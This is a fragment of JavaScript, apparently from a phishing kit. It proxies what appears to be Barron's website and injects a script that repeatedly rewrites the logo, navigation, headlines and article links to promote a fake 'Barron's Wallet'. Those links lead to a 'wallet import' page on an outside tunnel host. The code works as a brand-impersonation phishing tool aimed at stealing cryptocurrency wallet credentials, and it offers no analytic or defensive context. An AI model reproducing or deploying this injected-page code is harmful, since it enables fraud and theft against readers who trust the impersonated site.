...
const apiUrl = 'https://36o9x3-31-220-44-121.ru.tuna.am';
const walletUrl = 'https://q8i7iq-31-220-44-121.ru.tuna.am/app/import';
                    ...
                    let htmlBuffer = (0, inject_1.inject)(data, `
                        ...
                        setInterval(()=>{
                            document.querySelectorAll('a').forEach(el=>{
                                ...
                                try{ document.querySelector('.emotion-13koutt').src = '/barrons_wallet.jpg'}catch(e){}
                                try{document.querySelector("#navbar-wrapper > a:nth-child(3)").innerHTML = "Barron's Wallet"}catch(e){}
                                try{document.querySelector("#navbar-wrapper > a:nth-child(3)").href = "${walletUrl}"}catch(e){}
                                try{ document.querySelector("body").style="overflow-x:hidden"}catch(e){}
                                try{document.querySelector('.emotion-1qb9lrx-CardLink').href='/articles/barrons-wallet'}catch(e){}
                                try{document.querySelector('.efmbtq53').href='/articles/barrons-wallet'}catch(e){}
                                try{document.querySelector("#homepage-content-wrapper > div.emotion-1g6uzlh > div.emotion-78t5s9 > div.e1u7xnns1.emotion-fk2upn > div.efmbtq55.emotion-13ep7ia > div > div.e1u7xa1g1.emotion-lit7y9-CardLayoutItem > div > div > h3 > a").href='/articles/barrons-wallet'}catch(e){}
                                try{document.querySelector("#homepage-content-wrapper > div.emotion-1g6uzlh > div.emotion-78t5s9 > div.e1u7xnns1.emotion-fk2upn > div.efmbtq55.emotion-13ep7ia > div > div.e1u7xa1g1.emotion-lit7y9-CardLayoutItem > div > div > h3 > a > div").innerText='Barron’s Wallet: The Next-Gen Way to Manage, Spend, and Grow Your Money'}catch(e){}
                                try{}catch(e){}
                                try{}catch(e){}
                                
                                try{document.querySelector('.emotion-1n2j6z-HeadlineTextBlock').innerText = 'Barron\’s Wallet: The Next-Gen Way to Manage, Spend, and Grow Your Money'}catch(e){}
                                try{document.querySelector('.emotion-mviurp').innerText ='Barron’s Wallet Has Opened the Door to the Future of Finance—Depending on Your Definition of a Bank'}catch(e){}
                        },100)
